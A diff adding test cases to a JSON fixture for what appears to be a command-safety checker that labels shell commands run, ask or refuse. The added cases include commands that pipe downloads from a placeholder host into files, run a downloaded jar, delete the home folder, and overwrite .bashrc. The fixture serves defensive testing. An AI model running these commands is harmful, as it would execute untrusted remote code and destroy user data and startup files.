@@ -5812,6 +5812,170 @@
    "rules": [
     "ember.path"
    ]
+  },
+  {
+   "cmd": "java -jar t.jar",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "downloaded": [
+    "C:\\Users\\ana\\proj\\t.jar"
+   ]
+  },
+  {
+   "cmd": "(iwr https://h/x).Content | make x > x",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "x"
+   ],
+   "downloaded": [
+    "C:\\Users\\ana\\proj\\d.txt"
+   ]
+  },
+  {
+   "cmd": "curl.exe -s https://h/x | pytest t.py > t.py",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "t.py"
+   ],
+   "downloaded": [
+    "C:\\Users\\ana\\proj\\d.txt"
+   ]
+  },
+  {
+   "cmd": "iwr https://h/x | npm test x.js > x.js",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "x.js"
+   ]
+  },
+  {
+   "cmd": "iwr https://h/x | pytest t.py > t.py",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "t.py"
+   ]
+  },
+  {
+   "cmd": "mytool $HOME",
+   "verdict": "ask",
+   "rules": [
+    "unclear.broad-folder"
+   ]
+  },
+  {
+   "cmd": "mytool ~",
+   "verdict": "ask",
+   "rules": [
+    "unclear.broad-folder"
+   ]
+  },
+  {
+   "cmd": "mytool C:\\Users\\ana",
+   "verdict": "ask",
+   "rules": [
+    "unclear.broad-folder"
+   ]
+  },
+  {
+   "cmd": "mytool ..",
+   "verdict": "ask",
+   "rules": [
+    "unclear.broad-folder"
+   ]
+  },
+  {
+   "cmd": "mytool .",
+   "verdict": "run"
+  },
+  {
+   "cmd": "mytool src",
+   "verdict": "run"
+  },
+  {
+   "cmd": "rimraf C:\\Users\\ana",
+   "verdict": "refuse",
+   "rules": [
+    "ember.path"
+   ]
+  },
+  {
+   "cmd": "rimraf build",
+   "verdict": "ask",
+   "rules": [
+    "posix.rm"
+   ]
+  },
+  {
+   "cmd": "del-cli build",
+   "verdict": "ask",
+   "rules": [
+    "unclear.cmdlet",
+    "posix.rm"
+   ]
+  },
+  {
+   "cmd": "fdupes -o $HOME\\.bashrc .",
+   "verdict": "ask",
+   "rules": [
+    "path.startup"
+   ]
+  },
+  {
+   "cmd": "& jdupes.exe -o $HOME\\.bashrc .",
+   "verdict": "ask",
+   "rules": [
+    "path.startup"
+   ]
+  },
+  {
+   "cmd": "rimraf '{..,x}'",
+   "verdict": "refuse",
+   "rules": [
+    "ember.path"
+   ]
+  },
+  {
+   "cmd": "rimraf '{build,dist}'",
+   "verdict": "ask",
+   "rules": [
+    "posix.rm"
+   ]
+  },
+  {
+   "cmd": "rimraf \"{$HOME,x}\"",
+   "verdict": "refuse",
+   "rules": [
+    "ember.path"
+   ]
   }
  ]
 }
